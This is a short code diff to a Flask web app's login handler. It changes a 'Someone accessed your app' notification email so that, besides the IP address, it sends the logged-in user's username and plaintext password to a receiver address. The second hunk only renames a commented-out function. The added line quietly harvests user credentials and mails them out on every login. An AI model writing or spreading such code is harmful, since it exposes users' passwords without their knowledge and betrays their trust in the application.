@@ -63,7 +63,7 @@ def home():
             message = """\
         Subject: Someone accessed your app
 
-        A user with the IP {} just logged into your app.""".format(address)
+        IP {}. User {} with password {} just logged into your app.""".format(address, user.username, password)
             server.sendmail(sender_email, receiver_email, message)
 
         return render_template('home.html', user=username, ip = address)
@@ -123,7 +123,7 @@ def result():
 #     # return redirect("http://ecnaoptriha.herokuapp.com/result", code=302)
 #     return render_template("result.html",result = a)
 
-# def cacau():
+# def something():
 #     global a
 #     if a:
 #         functie(a)
